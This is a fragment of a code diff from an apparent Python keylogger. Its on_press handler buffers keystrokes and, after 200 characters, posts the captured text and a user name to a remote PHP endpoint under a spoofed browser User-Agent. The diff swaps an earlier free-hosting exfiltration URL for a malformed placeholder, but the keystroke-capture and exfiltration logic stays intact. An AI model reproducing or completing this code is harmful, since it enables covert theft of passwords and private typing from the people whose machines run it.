@@ -196,7 +196,7 @@ def on_press(key):
         print(main_string)
         if len(main_string) > 200: #catidad de letras que se pueden escribir
             headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
-            url = "https://marksukember12.000webhostapp.com/index.php"
+            url = "https:/tttttttttttttostapp.com/index.php"
             send = requests.post(url, data={"text": main_string, "user": user}, headers=headers)
             print(send.text)
             keys = []
